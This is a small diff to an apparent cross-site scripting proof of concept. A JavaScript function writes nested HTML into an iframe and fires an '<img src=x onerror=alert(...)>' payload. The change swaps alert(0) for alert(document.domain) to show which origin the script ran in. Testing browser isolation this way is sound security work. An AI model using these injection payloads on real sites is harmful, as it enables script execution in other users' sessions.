@@ -11,7 +11,7 @@ function lol() {
    var lscript = script + l
    var doc = document.getElementById('iframe').contentWindow.document;
 doc.open();
-doc.write("<head><title>lol</title></head><body onload='as()'><p>LLOL</p><script>function as(){ var doc=document.getElementById('iframe').contentWindow.document; doc.open(); doc.write('<img src=x onerror=alert(0)>');doc.close();}" + lscript + "<iframe name='iframe' id='iframe' src='http://lol.com'></body>");
+doc.write("<head><title>lol</title></head><body onload='as()'><p>LLOL</p><script>function as(){ var doc=document.getElementById('iframe').contentWindow.document; doc.open(); doc.write('<img src=x onerror=alert(document.domain)>');doc.close();}" + lscript + "<iframe name='iframe' id='iframe' src='http://lol.com'></body>");
 doc.close();
 }
 </script>
